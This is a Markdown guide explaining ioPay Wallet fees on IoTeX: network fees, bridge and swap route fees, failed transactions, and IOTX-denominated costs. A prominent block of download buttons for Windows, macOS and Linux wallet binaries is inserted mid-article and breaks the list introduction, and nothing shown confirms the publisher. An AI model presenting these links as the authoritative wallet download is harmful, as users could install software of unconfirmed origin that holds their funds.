![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# ioPay Wallet Fees, Explained

Three different costs get called "the fee", and only one of them is charged by the chain for every transaction:

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

1. **Network fee** - paid to IoTeX for including a transaction, shown before you sign, recorded afterwards with the block number and the fee paid (F020).
2. **Route fee** - what a bridge or a swap route charges, shown in its quote.
3. **Wallet fee** - what the app itself charges. Nothing in this project states one.

The app is free to download and the code is public, but this page will not claim "zero fees" as a slogan: what it can say is that no wallet fee is stated anywhere in the release, and that network fees are unavoidable because they belong to the chain.

## The network fee

Every transaction on IoTeX - a send, a stake, a bridge step, a device registration - costs a fee paid to the network, not to the wallet (F030). It is:

- **Shown before you confirm**, so you can see it on the review screen next to the amount;
- **Recorded after inclusion**, with the transaction's block number and the fee paid (F020);
- **Variable**, because it depends on network conditions at the moment the transaction is included.

This page does not quote an amount. A number written today would be wrong next week, and a fee quoted for a transfer is not the fee for a stake or a contract call - different transactions, different costs.

## Why a failed transaction is not the same as a failed transfer

**Broadcast failure** - the transaction never reached the network - costs nothing, because nothing was included. [More on that](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-transaction-stuck-pending.md).

**Mined but unsuccessful** - the transaction was included and charged its fee, even if the action inside it did not do what you hoped. The fee buys inclusion, not the outcome.

That distinction explains most "I was charged for a failed transaction" reports.

## Route fees

Bridging and swapping involve a route, and the route takes its own cut:

- **A bridge quote** shows its fee alongside the amount; the transfer also needs gas on the destination chain to complete, so a bridge has two gas costs, not one ([comparing routes](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-bridge-fees-versus-exchange-transfers.md)).
- **A swap quote** shows the rate and the price impact; [slippage settings](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-wallet-token-swap-slippage-settings.md) decide how far from the quote you will accept.

Neither is a wallet charge. Both are visible before you sign, which is the only thing that matters for deciding whether to proceed.

## What to check on the review screen

Before confirming anything, read four things:

- the **amount** you are sending or staking,
- the **fee** for this transaction,
- the **destination** (address, and which chain),
- the **result** you expect - a balance change, a staking bucket, a bridged asset.

Most fee surprises are actually amount-or-destination surprises: people notice the fee only after the fact, when the balance moved by more than the amount they had in mind. If a review screen shows no fee at all, you are not on the confirmation step yet - check which screen you are actually looking at before you sign.

## FAQ

**What fees does ioPay Wallet charge?**
No wallet fee is stated by the project. Network fees are charged by IoTeX for each transaction, and bridge or swap routes charge their own fee, shown in the quote.

**How much is a transfer fee?**
It varies with network conditions and is shown before you confirm. No fixed figure is quoted here.

**Does the wallet take a cut of staking rewards?**
Nothing published states one. The validator's commission is the cost that applies to staking, and it is displayed per validator.

**Are failed transactions free?**
A transaction that never broadcast costs nothing. A mined transaction pays its fee whether or not the action succeeded.

**Why did the fee change between two transfers?**
Network conditions changed. Fees are not fixed per wallet.

## What the chain charges for, and what it does not

Every action that changes state is its own transaction, and each one pays its own fee. Delegating is a transaction. Claiming rewards is a transaction. Unstaking is a transaction, and the withdraw that follows the unstaking period is another. A bridge is a transaction on each side. A device registration is a transaction.

That has a practical consequence people miss when they budget: a staking operation is rarely one fee. It is a short series - delegate now, claim later, unstake at the end of the term, withdraw after the lock - and the cost of the whole term is the sum of those fees, not the one you saw on the first screen. It also means a wallet with an empty spendable balance cannot complete the last step of an unstake even though the position itself is worth a lot: the fee comes from spendable IOTX, not from the staked bucket.

What the chain does *not* charge for is looking. Balances, history, positions, quotes and validator lists are reads, and reads are free. If a screen is asking you to pay to see your own balance, it is not the wallet.

## Reconstructing what you actually paid

History gives you the block number and the fee paid for each transaction (F020), which is the only reliable record of cost over time - more reliable than a quoted range, and the right input if you are working out what a year of staking actually cost. Export it, or read it on an explorer, before the detail stops mattering to you.

## Why the fee is denominated in IOTX

The network charges in the chain's own token, so the fee you approve is an amount of IOTX regardless of what the transaction moves. A transfer of an XRC-20 token still costs IOTX, and a bridge step on the IoTeX side costs IOTX even when the asset leaving is something else.

What that means in practice: the spendable IOTX balance is the budget for acting at all. An account holding only tokens can read everything and sign nothing, which is why keeping a small IOTX float matters more than estimating any single fee. Convert the cost to your own currency only after the fact, when the history shows what was actually paid.

---

*Fee behaviour follows IoTeX chain mechanics (F030) and the app's review/history display (F020). No fee amount is stated.*
